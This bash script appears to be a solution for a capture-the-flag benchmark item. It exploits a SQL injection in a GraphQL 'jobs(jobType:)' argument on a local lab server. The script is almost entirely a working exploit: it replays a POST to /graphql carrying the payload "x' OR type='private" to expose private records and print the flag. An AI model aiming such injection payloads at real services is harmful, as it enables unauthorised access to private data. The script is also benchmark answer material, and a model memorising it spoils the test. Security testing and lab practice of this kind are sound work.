#!/usr/bin/env bash
# XBEN-038-24 — SQL injection through a GraphQL argument. Proxy-mode twin. The
# jobs(jobType:) argument is concatenated into SQL; `x' OR type='private`
# returns the private jobs, one of which holds the flag.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
SESSION="xben038p-$$"; cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"; go "$URL/"; BASE="$(req_of GET /)"
"$H5I" websec replay "$BASE" --create --session "$SESSION" \
  --set 'method=POST' --set 'path=/graphql' \
  --set 'header.Content-Type=application/json' \
  --set "json.query=query { jobs(jobType: \"x' OR type='private\") { id name type description } }" >/dev/null
print_flag
